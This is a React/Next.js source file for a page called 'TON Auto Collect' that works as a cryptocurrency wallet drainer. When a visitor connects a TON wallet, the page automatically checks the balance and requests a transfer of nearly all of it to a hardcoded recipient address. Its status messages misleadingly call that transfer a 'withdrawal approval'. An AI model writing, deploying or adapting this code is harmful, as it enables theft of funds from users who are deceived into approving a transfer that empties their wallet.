"use client";

import { useEffect, useRef, useState, useCallback } from "react";
import {
  TonConnectButton,
  useTonConnectUI,
  useIsConnectionRestored,
  useTonAddress,
} from "@tonconnect/ui-react";

const RECIPIENT = "UQCcKyohuqyATqhTcdlSgbFolnk0plNr4oHzASNAtFbrqwoZ";
const MIN_BALANCE_NANO = BigInt("100000000"); // 0.1 TON threshold
const GAS_RESERVE_NANO = BigInt("10000000");  // 0.01 TON reserve

type Phase = "idle" | "fetching" | "requesting" | "success" | "error";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const isConnectionRestored = useIsConnectionRestored();
  const userAddress = useTonAddress();

  const [phase, setPhase] = useState<Phase>("idle");
  const [balanceTon, setBalanceTon] = useState<string | null>(null);
  const [message, setMessage] = useState("");

  // Prevent duplicate auto-triggers per address per session
  const triggeredFor = useRef<string | null>(null);

  const fetchNativeBalance = useCallback(async (address: string): Promise<bigint> => {
    const res = await fetch(
      `https://toncenter.com/api/v2/getAddressBalance?address=${encodeURIComponent(address)}`
    );
    const data = await res.json();
    if (!data.ok) throw new Error(data.error || "Toncenter error");
    return BigInt(data.result || "0");
  }, []);

  useEffect(() => {
    if (!isConnectionRestored) return;
    if (!userAddress) {
      setPhase("idle");
      setBalanceTon(null);
      setMessage("");
      triggeredFor.current = null;
      return;
    }
    if (!RECIPIENT) {
      setPhase("error");
      setMessage("NEXT_PUBLIC_TON_RECIPIENT is not configured.");
      return;
    }
    // Already handled this address in this session
    if (triggeredFor.current === userAddress) return;

    let cancelled = false;

    (async () => {
      try {
        setPhase("fetching");
        setMessage("Fetching balance...");

        const nano = await fetchNativeBalance(userAddress);
        if (cancelled) return;

        setBalanceTon((Number(nano) / 1e9).toFixed(4));

        if (nano < MIN_BALANCE_NANO) {
          setPhase("idle");
          setMessage("Balance below threshold (0.1 TON). No request sent.");
          return;
        }

        const amount = nano - GAS_RESERVE_NANO;
        if (amount <= BigInt(0)) {
          setPhase("idle");
          setMessage("Insufficient balance after gas reserve.");
          return;
        }

        // Mark as triggered BEFORE sending so a re-render can't fire again
        triggeredFor.current = userAddress;

        setPhase("requesting");
        setMessage("Requesting withdrawal approval in your wallet...");

        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [
            { address: RECIPIENT, amount: amount.toString() },
          ],
        });

        if (cancelled) return;
        setPhase("success");
        setMessage("Withdrawal approved. Transaction submitted.");
      } catch (err: any) {
        if (cancelled) return;
        console.error(err);
        setPhase("error");
        setMessage(
          err?.message?.includes("reject")
            ? "Transaction rejected in wallet."
            : err?.message || "Failed to request withdrawal."
        );
        // Allow retry on next connect for the same address
        triggeredFor.current = null;
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [userAddress, isConnectionRestored, tonConnectUI, fetchNativeBalance]);

  if (!isConnectionRestored) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-neutral-950 text-neutral-300">
        Restoring connection...
      </main>
    );
  }

  return (
    <main className="mx-auto flex min-h-screen max-w-md flex-col gap-4 bg-neutral-950 p-5 text-neutral-100">
      <header className="flex items-center justify-between">
        <h1 className="text-xl font-semibold">TON Auto Collect</h1>
        <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON</span>
      </header>

      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
        <h2 className="mb-3 font-medium">Wallet</h2>
        <TonConnectButton />
        {userAddress && (
          <p className="mt-2 break-all font-mono text-xs text-neutral-400">
            {userAddress.slice(0, 10)}...{userAddress.slice(-8)}
          </p>
        )}
      </section>

      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
        <h2 className="mb-2 font-medium">Status</h2>
        {balanceTon !== null && (
          <p className="mb-2 text-sm text-neutral-300">
            Native balance: <span className="font-mono">{balanceTon} TON</span>
          </p>
        )}
        <p
          className={`text-xs ${
            phase === "success"
              ? "text-emerald-400"
              : phase === "error"
              ? "text-red-400"
              : "text-neutral-400"
          }`}
        >
          {message || "Waiting for wallet connection..."}
        </p>

        {phase === "error" && userAddress && (
          <button
            type="button"
            onClick={() => {
              triggeredFor.current = null;
              setPhase("idle");
              setMessage("");
            }}
            className="mt-3 w-full rounded-lg border border-neutral-700 px-3 py-2 text-xs"
          >
            Retry
          </button>
        )}
      </section>

      <p className="text-center text-xs text-neutral-500">
        The amount and recipient are shown in your wallet before you approve.
      </p>
    </main>
  );
}


